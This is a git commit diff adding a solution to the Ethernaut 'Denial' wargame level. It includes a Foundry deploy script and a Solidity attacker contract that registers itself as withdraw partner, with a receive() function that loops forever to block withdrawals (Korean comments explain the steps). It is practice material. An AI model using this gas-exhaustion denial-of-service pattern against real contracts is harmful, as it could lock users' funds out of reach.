84615aaceb102bfce4ed4cbc8995bbd023102790
swollows <swollows9081@gmail.com>
2025-08-12 01:05:32 +0900

    Add Ethernaut Denial write-up

--- Wargame/ethernaut/20_denial/denial-poc/script/Deploy.s.sol
+++ Wargame/ethernaut/20_denial/denial-poc/script/Deploy.s.sol
@@ -2,21 +2,18 @@
 pragma solidity ^0.8.13;
 
 import "../src/Solve.sol";
-import "../src/Solver.sol";
 import {Script} from "forge-std/Script.sol";
 import "forge-std/console.sol";
 
 contract Deploy is Script {
-    address target = 0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3;
+    address target = 0x46682cA783d96a4A65390211934D5714CDb788E4;
 
     function run() external {
         vm.startBroadcast();
 
-        Solver solver = new Solver();
-        Solve solve = new Solve(target, address(solver));
+        Solve solve = new Solve(target);
 
         console.log("Solve Contract Address:", address(solve));
-        console.log("Solver Contract Address:", address(solver));
 
         solve.attack();
 
--- Wargame/ethernaut/20_denial/denial-poc/src/Solve.sol
+++ Wargame/ethernaut/20_denial/denial-poc/src/Solve.sol
@@ -2,35 +2,31 @@
 pragma solidity ^0.8.13;
 
 /* 목표
- * 10 바이트 이내의 바이트코드로 10진수 42(16진수 2a)를 반환하는 컨트랙트 제작하기
+ * withdraw 함수를 사용 불가한 상태로 만들기
  * 
  * 공격 방식
- * 1. https://www.evm.codes/playground 에서 bytecode로 보면 이런 코드가 있음. 604260005260206000F3 
- * 2. 바이트 코드를 분석하면 아래와 같음
- *   - 60 42 : PUSH1 0x42 (반환 값)
- *   - 60 00 : PUSH1 0x00 (메모리 주소 등록)
- *   - 52 : MSTORE (스택에 올렸던 2개의 값을 꺼내서 MSTORE(주소, 값) 형태로 메모리에 저장)
- *   - 60 20 : PUSH1 0x20 (반환할 데이터 길이)
- *   - 60 00 : PUSH1 0x00 (반환할 데이터의 시작 메모리 주소)
- *   - F3 : RETURN (스택에 올렸던 2개의 값을 꺼내서 RETURN(주소, 길이) 형태로 메모리 데이터 반환)
- * 3. 2번의 코드를 10진수 42를 반환할 수 있도록 0x42 -> 0x2a로 변경
- * 4. 3번에서 완성된 코드를 setSolver에 등록후 바이트 코드 실행 시 런타임 코드를 가져올 수 있도록 생성자에 직접 등록
+ * 1. setWithdrawPartner 함수를 이용하여 공격용 CA 주소를 Partner로 지정
+ * 2. 공격용 CA 컨트랙트에서 receive 함수에 while(true) 지정하여 DoS 공격하도록 설정
  */
 
-interface MagicNum {
-    function setSolver(address) external;
+interface Denial {
+    function setWithdrawPartner(address) external;
+    function withdraw() external;
+    function contractBalance() external returns (uint256);
 }
 
 contract Solve {
     address target;
-    address solver;
 
-    constructor(address _target, address _solver) {
+    constructor(address _target) {
         target = _target;
-        solver = _solver;
     }
 
     function attack() public {
-        MagicNum(target).setSolver(solver);
+        Denial(target).setWithdrawPartner(address(this));
+    }
+
+    receive() external payable {
+        while(true) {}
     }
 }
